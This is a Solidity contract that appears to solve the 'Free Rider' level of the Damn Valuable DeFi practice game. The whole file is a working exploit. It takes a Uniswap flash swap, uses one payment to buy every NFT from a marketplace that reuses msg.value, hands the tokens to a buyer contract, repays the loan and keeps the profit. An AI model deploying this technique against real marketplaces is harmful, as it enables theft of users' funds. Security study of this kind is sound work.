// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableNFT.sol";
import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderBuyer.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';

interface IWETH9 {
    function balanceOf(address) external returns (uint);
    function deposit() external payable;
    function withdraw(uint wad) external;
    function transfer(address dst, uint wad) external returns (bool);
}

contract FreeRiderAttack is IERC721Receiver {

    uint256 []tokenIds = [0, 1, 2, 3, 4, 5];

    IERC721 immutable private nft;
    IUniswapV2Pair immutable private pair;
    FreeRiderNFTMarketplace immutable private market;
    FreeRiderBuyer immutable private buyer;
    address immutable private attacker;


    constructor(address _nft, address _pair, address payable _market, address _buyer) {
        nft = IERC721(_nft);
        pair = IUniswapV2Pair(_pair);
        market = FreeRiderNFTMarketplace(_market);
        buyer = FreeRiderBuyer(_buyer);
        attacker = msg.sender;
    }

    function attack(address _tokenToBorrow, uint256 _amount) public {
        bytes memory data = abi.encode(_tokenToBorrow,_amount);

        address _token0 = pair.token0();
        address _token1 = pair.token1();

        uint256 _amount0Out = _tokenToBorrow == _token0 ? _amount : 0;
        uint256 _amount1Out = _tokenToBorrow == _token1 ? _amount : 0;
        
        pair.swap(              // uint amount0Out, uint amount1Out, address to, bytes calldata data
            _amount0Out,        // how much weth we want to receive 
            _amount1Out,        // amount of tokens we want to receive 
            address(this),      // send flash loan money to this contract
            data                // any data can be skipped
        );

        (bool success,) = msg.sender.call{value: address(this).balance}('');
        require(success, "Ether is not sent back");
    }
	
    // this function is needed by the off documentation to receive the flashswap from uniswap called by `swap` function.
    function uniswapV2Call(address sender, uint , uint , bytes calldata _data) external {

        require(msg.sender == address(pair), "Money is not from Uniswap pair pool!");
        require(sender == address(this), "We did not initiate this flash loan receive!");

        // parse the callback data 
        (address _tokenToBorrow, uint256 _amount) = abi.decode(_data,(address,uint256));

        // calculate the fee relying on the official uniswap documentation 
        uint256 fee = ((_amount *3)/997) + 1;
        uint amountToRepay = _amount + fee;

        IWETH9(_tokenToBorrow).withdraw(_amount);

        // receive all the NFT tokens for low price
        market.buyMany{ value: address(this).balance }(tokenIds);

        // send the ownership of the NFT tokens to the buyer
        for (uint i = 0; i < tokenIds.length; i++){
            nft.safeTransferFrom(address(this),address(buyer),tokenIds[i]);
        }

        // send borrowed money back 
        IWETH9(_tokenToBorrow).deposit{value: amountToRepay}();
        IERC20(_tokenToBorrow).transfer(address(pair), amountToRepay);
    }
	
    // this function is needed by the off documentation to receive the NFT token ownership called by `safeTransferFrom` function.
    function onERC721Received(address, address, uint256, bytes memory) external override returns (bytes4) {
        require(msg.sender == address(nft));
        require(tx.origin == attacker);
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}